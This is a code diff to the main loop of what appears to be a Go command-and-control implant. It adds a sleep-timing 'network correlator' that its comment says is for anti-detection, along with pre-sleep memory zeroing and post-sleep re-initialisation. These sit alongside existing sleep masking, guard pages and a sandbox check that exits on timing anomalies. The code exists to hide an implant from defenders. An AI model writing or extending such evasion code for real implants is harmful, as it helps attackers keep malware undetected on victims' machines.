@@ -131,6 +131,9 @@ func mainLoop(ctx context.Context, agent *structs.Agent, c2 profiles.Profile, so
 	// Semaphore to limit concurrent task goroutines (prevents memory exhaustion)
 	taskSem := make(chan struct{}, 20)
 
+	// Network correlator tracks sleep timing patterns for anti-detection
+	sleepCorrelator := commands.NewNetworkCorrelator(50)
+
 	// Main execution loop
 	retryCount := 0
 	for {
@@ -217,8 +220,15 @@ func mainLoop(ctx context.Context, agent *structs.Agent, c2 profiles.Profile, so
 				}(task)
 			}
 
+			// Pre-sleep cleanup: zero sensitive data from memory
+			commands.PreSleepCleanup()
+
 			// Sleep before next iteration — with optional sleep mask, guard pages, and sandbox detection
 			sleepTime := commands.CalculateAdaptiveSleep(agent.SleepInterval, agent.Jitter, agent.JitterProfile)
+			// Apply network correlation if enough samples exist
+			if sleepCorrelator != nil {
+				sleepTime = sleepCorrelator.CorrelatedSleep(sleepTime)
+			}
 			var vault *sleepVault
 			var guard *guardedPages
 			if sleepMaskEnabled {
@@ -227,6 +237,7 @@ func mainLoop(ctx context.Context, agent *structs.Agent, c2 profiles.Profile, so
 					guard = guardSleepPages(vault)
 				}
 			}
+			sleepStart := time.Now()
 			sleepSkipped := false
 			if sandboxGuardEnabled {
 				if !guardedSleep(sleepTime) {
@@ -235,12 +246,18 @@ func mainLoop(ctx context.Context, agent *structs.Agent, c2 profiles.Profile, so
 			} else {
 				time.Sleep(sleepTime)
 			}
+			// Record actual sleep duration for correlation analysis
+			if sleepCorrelator != nil {
+				sleepCorrelator.RecordSleep(time.Since(sleepStart))
+			}
 			if sleepMaskEnabled {
 				if guardPagesEnabled {
 					unguardSleepPages(guard, vault)
 				}
 				deobfuscateSleep(vault, agent, c2)
 			}
+			// Post-sleep re-initialization
+			commands.PostSleepInit()
 			if sleepSkipped {
 				log.Printf("timing anomaly, exiting")
 				return
